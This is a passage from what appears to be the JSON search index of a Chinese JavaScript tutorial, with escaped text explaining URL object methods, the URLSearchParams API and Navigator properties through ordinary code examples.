\u8be5\u65b9\u6cd5\u751f\u6210\u7684 URL \u5c31\u50cf\u4e0b\u9762\u7684\u6837\u5b50\u3002 1 blob : http : //localhost/c745ef73-ece9-46da-8f66-ebes574789b1 \u6ce8\u610f\uff0c\u6bcf\u6b21\u4f7f\u7528 URL.createObjectURL() \u65b9\u6cd5\uff0c\u90fd\u4f1a\u5728\u5185\u5b58\u91cc\u9762\u751f\u6210\u4e00\u4e2a URL \u5b9e\u4f8b\u3002\u5982\u679c\u4e0d\u518d\u9700\u8981\u8be5\u65b9\u6cd5\u751f\u6210\u7684 URL \u5b57\u7b26\u4e32\uff0c\u4e3a\u4e86\u8282\u7701\u5185\u5b58\uff0c\u53ef\u4ee5\u4f7f\u7528 URL.revokeObjectURL() \u65b9\u6cd5\u91ca\u653e\u8fd9\u4e2a\u5b9e\u4f8b\u3002 \uff082\uff09URL.revokeObjectURL() URL.revokeObjectURL() \u65b9\u6cd5\u7528\u6765\u91ca\u653e URL.createObjectURL() \u65b9\u6cd5\u751f\u6210\u7684 URL \u5b9e\u4f8b\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f URL.createObjectURL() \u65b9\u6cd5\u8fd4\u56de\u7684 URL \u5b57\u7b26\u4e32\u3002 \u4e0b\u9762\u4e3a\u4e0a\u4e00\u6bb5\u7684\u793a\u4f8b\u52a0\u4e0a URL.revokeObjectURL() \u3002 1 2 3 4 5 6 7 8 9 10 11 12 var div = document . getElementById ( 'display' ); function handleFiles ( files ) { for ( var i = 0 ; i < files . length ; i ++ ) { var img = document . createElement ( 'img' ); img . src = window . URL . createObjectURL ( files [ i ]); div . appendChild ( img ); img . onload = function () { window . URL . revokeObjectURL ( this . src ); } } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u65e6\u56fe\u7247\u52a0\u8f7d\u6210\u529f\u4ee5\u540e\uff0c\u4e3a\u672c\u5730\u6587\u4ef6\u751f\u6210\u7684 URL \u5b57\u7b26\u4e32\u5c31\u6ca1\u7528\u4e86\uff0c\u4e8e\u662f\u53ef\u4ee5\u5728 img.onload \u56de\u8c03\u51fd\u6570\u91cc\u9762\uff0c\u901a\u8fc7 URL.revokeObjectURL() \u65b9\u6cd5\u5378\u8f7d\u8fd9\u4e2a URL \u5b9e\u4f8b\u3002","title":"\u9759\u6001\u65b9\u6cd5"},{"location":"bom/location/#urlsearchparams","text":"","title":"URLSearchParams \u5bf9\u8c61"},{"location":"bom/location/#_6","text":"URLSearchParams \u5bf9\u8c61\u662f\u6d4f\u89c8\u5668\u7684\u539f\u751f\u5bf9\u8c61\uff0c\u7528\u6765\u6784\u9020\u3001\u89e3\u6790\u548c\u5904\u7406 URL \u7684\u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u5373 URL \u95ee\u53f7\u540e\u9762\u7684\u90e8\u5206\uff09\u3002 \u5b83\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u751f\u6210\u5b9e\u4f8b\u3002\u53c2\u6570\u53ef\u4ee5\u4e3a\u67e5\u8be2\u5b57\u7b26\u4e32\uff0c\u8d77\u9996\u7684\u95ee\u53f7 ? \u6709\u6ca1\u6709\u90fd\u884c\uff0c\u4e5f\u53ef\u4ee5\u662f\u5bf9\u5e94\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6570\u7ec4\u6216\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 // \u65b9\u6cd5\u4e00\uff1a\u4f20\u5165\u5b57\u7b26\u4e32 var params = new URLSearchParams ( '?foo=1&bar=2' ); // \u7b49\u540c\u4e8e var params = new URLSearchParams ( document . location . search ); // \u65b9\u6cd5\u4e8c\uff1a\u4f20\u5165\u6570\u7ec4 var params = new URLSearchParams ([[ 'foo' , 1 ], [ 'bar' , 2 ]]); // \u65b9\u6cd5\u4e09\uff1a\u4f20\u5165\u5bf9\u8c61 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); URLSearchParams \u4f1a\u5bf9\u67e5\u8be2\u5b57\u7b26\u4e32\u81ea\u52a8\u7f16\u7801\u3002 1 2 var params = new URLSearchParams ({ 'foo' : '\u4f60\u597d' }); params . toString () // \"foo=%E4%BD%A0%E5%A5%BD\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c foo \u7684\u503c\u662f\u6c49\u5b57\uff0c URLSearchParams \u5bf9\u5176\u81ea\u52a8\u8fdb\u884c URL \u7f16\u7801\u3002 \u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001\u8868\u5355\u6570\u636e\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 URLSearchParams \u5b9e\u4f8b\u4f5c\u4e3a\u8868\u5355\u6570\u636e\u3002 1 2 3 4 5 const params = new URLSearchParams ({ foo : 1 , bar : 2 }); fetch ( 'https://example.com/api' , { method : 'POST' , body : params }). then (...) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c fetch \u547d\u4ee4\u5411\u670d\u52a1\u5668\u53d1\u9001\u547d\u4ee4\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 URLSearchParams \u5b9e\u4f8b\u3002 URLSearchParams \u53ef\u4ee5\u4e0e URL() \u63a5\u53e3\u7ed3\u5408\u4f7f\u7528\u3002 1 2 var url = new URL ( window . location ); var foo = url . searchParams . get ( 'foo' ) || 'somedefault' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cURL \u5b9e\u4f8b\u7684 searchParams \u5c5e\u6027\u5c31\u662f\u4e00\u4e2a URLSearchParams \u5b9e\u4f8b\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 URLSearchParams \u63a5\u53e3\u7684 get \u65b9\u6cd5\u3002 URLSearchParams \u5b9e\u4f8b\u6709\u904d\u5386\u5668\u63a5\u53e3\uff0c\u53ef\u4ee5\u7528 for...of \u5faa\u73af\u904d\u5386\uff08\u8be6\u89c1\u300aES6 \u6807\u51c6\u5165\u95e8\u300b\u7684\u300aIterator\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 7 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); for ( var p of params ) { console . log ( p [ 0 ] + ': ' + p [ 1 ]); } // foo: 1 // bar: 2 URLSearchParams \u6ca1\u6709\u5b9e\u4f8b\u5c5e\u6027\uff0c\u53ea\u6709\u5b9e\u4f8b\u65b9\u6cd5\u3002","title":"\u6982\u8ff0"},{"location":"bom/location/#urlsearchparamstostring","text":"toString \u65b9\u6cd5\u8fd4\u56de\u5b9e\u4f8b\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 var url = new URL ( 'https://example.com?foo=1&bar=2' ); var params = new URLSearchParams ( url . search ); params . toString () // \"foo=1&bar=2' \u90a3\u4e48\u9700\u8981\u5b57\u7b26\u4e32\u7684\u573a\u5408\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528 toString \u65b9\u6cd5\u3002 1 2 var params = new URLSearchParams ({ version : 2.0 }); window . location . href = location . pathname + '?' + params ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c location.href \u8d4b\u503c\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 params \u5bf9\u8c61\u3002\u8fd9\u65f6\u5c31\u4f1a\u81ea\u52a8\u8c03\u7528 toString \u65b9\u6cd5\u3002","title":"URLSearchParams.toString()"},{"location":"bom/location/#urlsearchparamsappend","text":"append() \u65b9\u6cd5\u7528\u6765\u8ffd\u52a0\u4e00\u4e2a\u67e5\u8be2\u53c2\u6570\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u4e3a\u952e\u540d\uff0c\u7b2c\u4e8c\u4e2a\u4e3a\u952e\u503c\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . append ( 'baz' , 3 ); params . toString () // \"foo=1&bar=2&baz=3\" append() \u65b9\u6cd5\u4e0d\u4f1a\u8bc6\u522b\u662f\u5426\u952e\u540d\u5df2\u7ecf\u5b58\u5728\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . append ( 'foo' , 3 ); params . toString () // \"foo=1&bar=2&foo=3\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u67e5\u8be2\u5b57\u7b26\u4e32\u91cc\u9762 foo \u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u4f46\u662f append \u4f9d\u7136\u4f1a\u8ffd\u52a0\u4e00\u4e2a\u540c\u540d\u952e\u3002","title":"URLSearchParams.append()"},{"location":"bom/location/#urlsearchparamsdelete","text":"delete() \u65b9\u6cd5\u7528\u6765\u5220\u9664\u6307\u5b9a\u7684\u67e5\u8be2\u53c2\u6570\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . delete ( 'bar' ); params . toString () // \"foo=1\"","title":"URLSearchParams.delete()"},{"location":"bom/location/#urlsearchparamshas","text":"has() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67e5\u8be2\u5b57\u7b26\u4e32\u662f\u5426\u5305\u542b\u6307\u5b9a\u7684\u952e\u540d\u3002 1 2 3 var params = new URLSearchParams ({ 'foo' : 1 , 'bar' : 2 }); params . has ( 'bar' ) // true params . has ( 'baz' ) // false","title":"URLSearchParams.has()"},{"location":"bom/location/#urlsearchparamsset","text":"set() \u65b9\u6cd5\u7528\u6765\u8bbe\u7f6e\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u952e\u503c\u3002 \u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u952e\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u952e\u503c\u3002\u5982\u679c\u662f\u5df2\u7ecf\u5b58\u5728\u7684\u952e\uff0c\u952e\u503c\u4f1a\u88ab\u6539\u5199\uff0c\u5426\u5219\u4f1a\u88ab\u8ffd\u52a0\u3002 1 2 3 4 5 var params = new URLSearchParams ( '?foo=1' ); params . set ( 'foo' , 2 ); params . toString () // \"foo=2\" params . set ( 'bar' , 3 ); params . toString () // \"foo=2&bar=3\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c foo \u662f\u5df2\u7ecf\u5b58\u5728\u7684\u952e\uff0c bar \u662f\u8fd8\u4e0d\u5b58\u5728\u7684\u952e\u3002 \u5982\u679c\u6709\u591a\u4e2a\u7684\u540c\u540d\u952e\uff0c set \u4f1a\u79fb\u9664\u73b0\u5b58\u6240\u6709\u7684\u952e\u3002 1 2 3 var params = new URLSearchParams ( '?foo=1&foo=2' ); params . set ( 'foo' , 3 ); params . toString () // \"foo=3\" \u4e0b\u9762\u662f\u4e00\u4e2a\u66ff\u6362\u5f53\u524d URL \u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 // URL: https://example.com?version=1.0 var params = new URLSearchParams ( location . search . slice ( 1 )); params . set ( 'version' , '2.0' ); window . history . replaceState ({}, '' , location . pathname + `?` + params ); // URL: https://example.com?version=2.0","title":"URLSearchParams.set()"},{"location":"bom/location/#urlsearchparamsgeturlsearchparamsgetall","text":"get() \u65b9\u6cd5\u7528\u6765\u8bfb\u53d6\u67e5\u8be2\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6307\u5b9a\u952e\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 3 var params = new URLSearchParams ( '?foo=1' ); params . get ( 'foo' ) // \"1\" params . get ( 'bar' ) // null \u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u7b2c\u4e00\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u539f\u59cb\u503c\u662f\u6570\u503c\uff0c\u9700\u8981\u8f6c\u4e00\u4e0b\u7c7b\u578b\uff1b\u7b2c\u4e8c\uff0c\u5982\u679c\u6307\u5b9a\u7684\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de\u503c\u662f null \u3002 \u5982\u679c\u6709\u591a\u4e2a\u7684\u540c\u540d\u952e\uff0c get \u8fd4\u56de\u4f4d\u7f6e\u6700\u524d\u9762\u7684\u90a3\u4e2a\u952e\u503c\u3002 1 2 var params = new URLSearchParams ( '?foo=3&foo=2&foo=1' ); params . get ( 'foo' ) // \"3\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u67e5\u8be2\u5b57\u7b26\u4e32\u6709\u4e09\u4e2a foo \u952e\uff0c get \u65b9\u6cd5\u8fd4\u56de\u6700\u524d\u9762\u7684\u952e\u503c 3 \u3002 getAll() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u6307\u5b9a\u952e\u7684\u6240\u6709\u952e\u503c\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 var params = new URLSearchParams ( '?foo=1&foo=2' ); params . getAll ( 'foo' ) // [\"1\", \"2\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u67e5\u8be2\u5b57\u7b26\u4e32\u6709\u4e24\u4e2a foo \u952e\uff0c getAll \u8fd4\u56de\u7684\u6570\u7ec4\u5c31\u6709\u4e24\u4e2a\u6210\u5458\u3002","title":"URLSearchParams.get()\uff0cURLSearchParams.getAll()"},{"location":"bom/location/#urlsearchparamssort","text":"sort() \u65b9\u6cd5\u5bf9\u67e5\u8be2\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u952e\u8fdb\u884c\u6392\u5e8f\uff0c\u89c4\u5219\u662f\u6309\u7167 Unicode \u7801\u70b9\u4ece\u5c0f\u5230\u5927\u6392\u5217\u3002 \u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u6216\u8005\u8bf4\u8fd4\u56de\u503c\u662f undefined \u3002 1 2 3 var params = new URLSearchParams ( 'c=4&a=2&b=3&a=1' ); params . sort (); params . toString () // \"a=2&a=1&b=3&c=4\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u6709\u4e24\u4e2a\u540c\u540d\u7684\u952e a \uff0c\u5b83\u4eec\u4e4b\u95f4\u4e0d\u4f1a\u6392\u5e8f\uff0c\u800c\u662f\u4fdd\u7559\u539f\u59cb\u7684\u987a\u5e8f\u3002","title":"URLSearchParams.sort()"},{"location":"bom/location/#urlsearchparamskeysurlsearchparamsvaluesurlsearchparamsentries","text":"\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u4f9b for...of \u5faa\u73af\u904d\u5386\u3002\u5b83\u4eec\u7684\u533a\u522b\u5728\u4e8e\uff0c keys \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u952e\u540d\u7684\u904d\u5386\u5668\uff0c values \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u952e\u503c\u7684\u904d\u5386\u5668\uff0c entries \u8fd4\u56de\u7684\u662f\u952e\u503c\u5bf9\u7684\u904d\u5386\u5668\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var params = new URLSearchParams ( 'a=1&b=2' ); for ( var p of params . keys ()) { console . log ( p ); } // a // b for ( var p of params . values ()) { console . log ( p ); } // 1 // 2 for ( var p of params . entries ()) { console . log ( p ); } // [\"a\", \"1\"] // [\"b\", \"2\"] \u5982\u679c\u76f4\u63a5\u5bf9 URLSearchParams \u8fdb\u884c\u904d\u5386\uff0c\u5176\u5b9e\u5185\u90e8\u8c03\u7528\u7684\u5c31\u662f entries \u63a5\u53e3\u3002 1 2 3 for ( var p of params ) {} // \u7b49\u540c\u4e8e for ( var p of params . entries ()) {}","title":"URLSearchParams.keys()\uff0cURLSearchParams.values()\uff0cURLSearchParams.entries()"},{"location":"bom/location/#_7","text":"Location , by MDN URL , by MDN URLSearchParams , by MDN Easy URL Manipulation with URLSearchParams , by Eric Bidelman","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/navigator/","text":"Navigator \u5bf9\u8c61\uff0cScreen \u5bf9\u8c61\u3002 \u00b6 window.navigator \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u5305\u542b\u6d4f\u89c8\u5668\u548c\u7cfb\u7edf\u4fe1\u606f\u7684 Navigator \u5bf9\u8c61\u3002\u811a\u672c\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u4e86\u89e3\u7528\u6237\u7684\u73af\u5883\u4fe1\u606f\u3002 Navigator \u5bf9\u8c61\u7684\u5c5e\u6027 \u00b6 Navigator.userAgent \u00b6 navigator.userAgent \u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u7684 User Agent \u5b57\u7b26\u4e32\uff0c\u8868\u793a\u7528\u6237\u8bbe\u5907\u4fe1\u606f\uff0c\u5305\u542b\u4e86\u6d4f\u89c8\u5668\u7684\u5382\u5546\u3001\u7248\u672c\u3001\u64cd\u4f5c\u7cfb\u7edf\u7b49\u4fe1\u606f\u3002 \u4e0b\u9762\u662f Chrome \u6d4f\u89c8\u5668\u7684 userAgent \u3002 1 2 navigator . userAgent // \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36\" \u901a\u8fc7 userAgent \u5c5e\u6027\u8bc6\u522b\u6d4f\u89c8\u5668\uff0c\u4e0d\u662f\u4e00\u4e2a\u597d\u529e\u6cd5\u3002\u56e0\u4e3a\u5fc5\u987b\u8003\u8651\u6240\u6709\u7684\u60c5\u51b5\uff08\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\uff0c\u4e0d\u540c\u7684\u7248\u672c\uff09\uff0c\u975e\u5e38\u9ebb\u70e6\uff0c\u800c\u4e14\u7528\u6237\u53ef\u4ee5\u6539\u53d8\u8fd9\u4e2a\u5b57\u7b26\u4e32\u3002\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\u5e76\u65e0\u7edf\u4e00\u89c4\u5b9a\uff0c\u4e5f\u65e0\u6cd5\u4fdd\u8bc1\u672a\u6765\u7684\u9002\u7528\u6027\uff0c\u5404\u79cd\u4e0a\u7f51\u8bbe\u5907\u5c42\u51fa\u4e0d\u7a77\uff0c\u96be\u4ee5\u7a77\u5c3d\u3002\u6240\u4ee5\uff0c\u73b0\u5728\u4e00\u822c\u4e0d\u518d\u901a\u8fc7\u5b83\u8bc6\u522b\u6d4f\u89c8\u5668\u4e86\uff0c\u800c\u662f\u4f7f\u7528\u201c\u529f\u80fd\u8bc6\u522b\u201d\u65b9\u6cd5\uff0c\u5373\u9010\u4e00\u6d4b\u8bd5\u5f53\u524d\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301\u8981\u7528\u5230\u7684 JavaScript \u529f\u80fd\u3002 \u4e0d\u8fc7\uff0c\u901a\u8fc7 userAgent \u53ef\u4ee5\u5927\u81f4\u51c6\u786e\u5730\u8bc6\u522b\u624b\u673a\u6d4f\u89c8\u5668\uff0c\u65b9\u6cd5\u5c31\u662f\u6d4b\u8bd5\u662f\u5426\u5305\u542b mobi \u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var ua = navigator . userAgent . toLowerCase (); if ( /mobi/ . test ( ua )) { // \u624b\u673a\u6d4f\u89c8\u5668 } else { // \u975e\u624b\u673a\u6d4f\u89c8\u5668 } \u5982\u679c\u60f3\u8981\u8bc6\u522b\u6240\u6709\u79fb\u52a8\u8bbe\u5907\u7684\u6d4f\u89c8\u5668\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u66f4\u591a\u7684\u7279\u5f81\u5b57\u7b26\u4e32\u3002 1 /mobi|android|touch|mini/ . test ( ua ) Navigator.plugins \u00b6 Navigator.plugins \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f Plugin \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u5b89\u88c5\u7684\u63d2\u4ef6\uff0c\u6bd4\u5982 Flash\u3001ActiveX \u7b49\u3002 1 2 3 4 5 6 7 8 var pluginsLength = navigator . plugins . length ; for ( var i = 0 ; i < pluginsLength ; i ++ ) { console . log ( navigator . plugins [ i ]. name ); console . log ( navigator . plugins [ i ]. filename ); console . log ( navigator . plugins [ i ]. description ); console . log ( navigator . plugins [ i ]. version ); } Navigator.platform \u00b6 Navigator.platform \u5c5e\u6027\u8fd4\u56de\u7528\u6237\u7684\u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\uff0c\u6bd4\u5982 MacIntel \u3001 Win32 \u3001 Linux x86_64 \u7b49 \u3002 1 2 navigator . platform // \"Linux x86_64\" Navigator.onLine \u00b6 navigator.onLine \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u5f53\u524d\u5728\u7ebf\u8fd8\u662f\u79bb\u7ebf\uff08\u6d4f\u89c8\u5668\u65ad\u7ebf\uff09\u3002 1 navigator . onLine // true \u6709\u65f6\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u8fde\u63a5\u5c40\u57df\u7f51\uff0c\u4f46\u662f\u5c40\u57df\u7f51\u4e0d\u80fd\u8fde\u901a\u5916\u7f51\u3002\u8fd9\u65f6\uff0c\u6709\u7684\u6d4f\u89c8\u5668\u7684 onLine \u5c5e\u6027\u4f1a\u8fd4\u56de true \uff0c\u6240\u4ee5\u4e0d\u80fd\u5047\u5b9a\u53ea\u8981\u662f true \uff0c\u7528\u6237\u5c31\u4e00\u5b9a\u80fd\u8bbf\u95ee\u4e92\u8054\u7f51\u3002\u4e0d\u8fc7\uff0c\u5982\u679c\u662f false \uff0c\u53ef\u4ee5\u65ad\u5b9a\u7528\u6237\u4e00\u5b9a\u79bb\u7ebf\u3002 \u7528\u6237\u53d8\u6210\u5728\u7ebf\u4f1a\u89e6\u53d1 online \u4e8b\u4ef6\uff0c\u53d8\u6210\u79bb\u7ebf\u4f1a\u89e6\u53d1 offline \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7 window.ononline \u548c window.onoffline \u6307\u5b9a\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 window . addEventListener ( 'offline' , function ( e ) { console . log ( 'offline' ); }); window . addEventListener ( 'online' , function ( e ) { console . log ( 'online' ); }); Navigator.language\uff0cNavigator.languages \u00b6 Navigator.language \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7684\u9996\u9009\u8bed\u8a00\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 navigator . language // \"en\" Navigator.languages \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u8868\u793a\u7528\u6237\u53ef\u4ee5\u63a5\u53d7\u7684\u8bed\u8a00\u3002 Navigator.language \u603b\u662f\u8fd9\u4e2a\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u3002HTTP \u8bf7\u6c42\u5934\u4fe1\u606f\u7684 Accept-Language \u5b57\u6bb5\uff0c\u5c31\u6765\u81ea\u8fd9\u4e2a\u6570\u7ec4\u3002 1 navigator . languages // [\"en-US\", \"en\", \"zh-CN\", \"zh\", \"zh-TW\"] \u5982\u679c\u8fd9\u4e2a\u5c5e\u6027\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u5728 window \u5bf9\u8c61\u4e0a\u89e6\u53d1 languagechange \u4e8b\u4ef6\u3002 Navigator.geolocation \u00b6 Navigator.geolocation \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a Geolocation \u5bf9\u8c61\uff0c\u5305\u542b\u7528\u6237\u5730\u7406\u4f4d\u7f6e\u7684\u4fe1\u606f\u3002\u6ce8\u610f\uff0c\u8be5 API \u53ea\u6709\u5728 HTTPS \u534f\u8bae\u4e0b\u53ef\u7528\uff0c\u5426\u5219\u8c03\u7528\u4e0b\u9762\u65b9\u6cd5\u65f6\u4f1a\u62a5\u9519\u3002 Geolocation \u5bf9\u8c61\u63d0\u4f9b\u4e0b\u9762\u4e09\u4e2a\u65b9\u6cd5\u3002 Geolocation.getCurrentPosition()\uff1a\u5f97\u5230\u7528\u6237\u7684\u5f53\u524d\u4f4d\u7f6e Geolocation.watchPosition()\uff1a\u76d1\u542c\u7528\u6237\u4f4d\u7f6e\u53d8\u5316 Geolocation.clearWatch()\uff1a\u53d6\u6d88 watchPosition() \u65b9\u6cd5\u6307\u5b9a\u7684\u76d1\u542c\u51fd\u6570 \u6ce8\u610f\uff0c\u8c03\u7528\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u8df3\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u8981\u6c42\u7528\u6237\u7ed9\u4e88\u6388\u6743\u3002 Navigator.cookieEnabled \u00b6 navigator.cookieEnabled \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7684 Cookie \u529f\u80fd\u662f\u5426\u6253\u5f00\u3002 1 navigator . cookieEnabled // true \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u53cd\u6620\u7684\u662f\u6d4f\u89c8\u5668\u603b\u7684\u7279\u6027\uff0c\u4e0e\u662f\u5426\u50a8\u5b58\u67d0\u4e2a\u5177\u4f53\u7684\u7f51\u7ad9\u7684 Cookie \u65e0\u5173\u3002\u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u67d0\u4e2a\u7f51\u7ad9\u4e0d\u5f97\u50a8\u5b58 Cookie\uff0c\u8fd9\u65f6 cookieEnabled \u8fd4\u56de\u7684\u8fd8\u662f true \u3002 Navigator \u5bf9\u8c61\u7684\u65b9\u6cd5 \u00b6 Navigator.javaEnabled() \u00b6 navigator.javaEnabled() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u80fd\u8fd0\u884c Java Applet \u5c0f\u7a0b\u5e8f\u3002 1 navigator . javaEnabled () // false Navigator.sendBeacon() \u00b6 Navigator.sendBeacon() \u65b9\u6cd5\u7528\u4e8e\u5411\u670d\u52a1\u5668\u5f02\u6b65\u53d1\u9001\u6570\u636e\uff0c\u8be6\u89c1\u300aXMLHttpRequest \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 Navigator \u7684\u5b9e\u9a8c\u6027\u5c5e\u6027 \u00b6 Navigator \u5bf9\u8c61\u6709\u4e00\u4e9b\u5b9e\u9a8c\u6027\u5c5e\u6027\uff0c\u5728\u90e8\u5206\u6d4f\u89c8\u5668\u53ef\u7528\u3002 Navigator.deviceMemory \u00b6 navigator.deviceMemory \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8ba1\u7b97\u673a\u7684\u5185\u5b58\u6570\u91cf\uff08\u5355\u4f4d\u4e3a GB\uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u53ea\u5728 HTTPS \u73af\u5883\u4e0b\u53ef\u7528\u3002 \u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u8fd1\u4f3c\u503c\uff0c\u56db\u820d\u4e94\u5165\u5230\u6700\u63a5\u8fd1\u76842\u7684\u5e42\uff0c\u901a\u5e38\u662f 0.25\u30010.5\u30011\u30012\u30014\u30018\u3002\u5b9e\u9645\u5185\u5b58\u8d85\u8fc7 8GB\uff0c\u4e5f\u8fd4\u56de 8 \u3002 1 2 3 if ( navigator . deviceMemory > 1 ) { await import ( './costly-module.js' ); } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u53ea\u6709\u5f53\u524d\u5185\u5b58\u5927\u4e8e 1GB\uff0c\u624d\u52a0\u8f7d\u5927\u578b\u7684\u811a\u672c\u3002 Navigator.hardwareConcurrency \u00b6 navigator.hardwareConcurrency \u5c5e\u6027\u8fd4\u56de\u7528\u6237\u8ba1\u7b97\u673a\u4e0a\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\u7684\u6570\u91cf\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u73b0\u4ee3\u8ba1\u7b97\u673a\u7684 CPU \u6709\u591a\u4e2a\u7269\u7406\u6838\u5fc3\uff0c\u6bcf\u4e2a\u7269\u7406\u6838\u5fc3\u6709\u65f6\u652f\u6301\u4e00\u6b21\u8fd0\u884c\u591a\u4e2a\u7ebf\u7a0b\u3002\u56e0\u6b64\uff0c\u56db\u6838 CPU \u53ef\u4ee5\u63d0\u4f9b\u516b\u4e2a\u903b\u8f91\u5904\u7406\u5668\u6838\u5fc3\u3002 1 2 3 if ( navigator . hardwareConcurrency > 4 ) { await import ( './costly-module.js' ); } 